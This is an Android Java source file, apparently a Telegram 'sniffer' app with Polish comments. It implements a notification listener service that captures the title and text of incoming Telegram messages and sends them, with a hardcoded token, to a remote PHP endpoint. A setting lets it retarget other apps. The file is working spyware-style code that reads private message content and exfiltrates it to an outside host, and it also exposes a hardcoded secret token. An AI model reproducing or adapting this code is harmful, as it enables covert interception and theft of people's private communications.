package com.example.solexxsnifferv2;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class CustomNotificationListenerService extends NotificationListenerService {

    private static String TAG = "NotificationListener";
    private static String TELEGRAM_PACKAGE_NAME = "org.telegram.messenger"; // Nazwa pakietu aplikacji Telegram
    private static String POST_URL = "https://capybara.s1.zetohosting.pl/add.php";
    private static String TOKEN = "GPuO3vpOdl0Ox087qJulkrS0CvHpk0YEX7dzsSF028D2Rv92R41AJ6BKMwUc9y3l";

    public static void updateSettings(String packageName, String postUrl, String token) {
        TELEGRAM_PACKAGE_NAME = packageName;
        POST_URL = postUrl + "/add.php";
        TOKEN = token;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        // Sprawdzenie, czy powiadomienie pochodzi z aplikacji Telegram
        if (TELEGRAM_PACKAGE_NAME.equals(sbn.getPackageName())) {
            Log.i(TAG, "Otrzymano powiadomienie z Telegram: " + sbn.getPackageName());

            Notification notification = sbn.getNotification();
            if (notification != null) {
                Bundle extras = notification.extras;
                String title = extras.getString(Notification.EXTRA_TITLE); // Tytuł powiadomienia
                String text = extras.getCharSequence(Notification.EXTRA_TEXT) != null
                        ? extras.getCharSequence(Notification.EXTRA_TEXT).toString() // Treść powiadomienia
                        : "Brak treści";

                // Wyświetlenie tytułu i treści powiadomienia w logach
                Log.i(TAG, "Tytuł powiadomienia: " + title);
                Log.i(TAG, "Treść powiadomienia: " + text);

                // Wysłanie danych do endpointa POST
                sendPostRequest(title, text, TOKEN);
            } else {
                Log.i(TAG, "Brak szczegółów powiadomienia");
            }
        } else {
            Log.i(TAG, "Powiadomienie nie pochodzi z Telegrama, ignoruję.");
        }
    }

    private void sendPostRequest(String title, String text, String token) {
        new Thread(() -> {
            try {
                URL url = new URL(POST_URL);
                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("POST");
                urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                urlConnection.setDoOutput(true);

                // Tworzenie payloadu do wysłania
                String postData = "title=" + title + "&text=" + text + "&token=" + token;
                byte[] postDataBytes = postData.getBytes(StandardCharsets.UTF_8);

                OutputStream os = urlConnection.getOutputStream();
                os.write(postDataBytes);
                os.flush();
                os.close();

                // Odbieranie odpowiedzi
                int responseCode = urlConnection.getResponseCode();
                Log.i(TAG, "Odpowiedź serwera: " + responseCode);
                urlConnection.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Błąd przy wysyłaniu żądania POST", e);
            }
        }).start();
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        if (TELEGRAM_PACKAGE_NAME.equals(sbn.getPackageName())) {
            Log.i(TAG, "Powiadomienie z Telegram zostało usunięte: " + sbn.getPackageName());
        }
    }
}
